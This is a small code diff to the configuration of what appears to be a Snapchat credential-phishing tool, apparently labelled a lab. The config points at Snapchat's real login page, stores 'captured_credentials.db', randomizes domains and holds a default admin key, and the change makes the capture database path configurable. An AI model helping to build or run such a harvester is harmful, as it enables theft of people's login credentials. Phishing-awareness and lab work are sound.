@@ -7,7 +7,7 @@ CONFIG = {
     "SNAPCHAT_LOGIN_URL": "https://accounts.snapchat.com/login",
     "SERVER_PORT": 8080,
     "USE_HTTPS": True,
-    "CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db"),
+    "CAPTURE_DB": os.environ.get("CAPTURE_DB", os.path.join(BASE_DIR, "captured_credentials.db")),
     "SESSION_TTL_MINUTES": 60,
     "RANDOMIZE_DOMAINS": True,
     "ADMIN_KEY": os.environ.get("SNAPCHAT_LAB_ADMIN_KEY", "CHANGE_ME_SNAPCHAT_LAB_2024"),
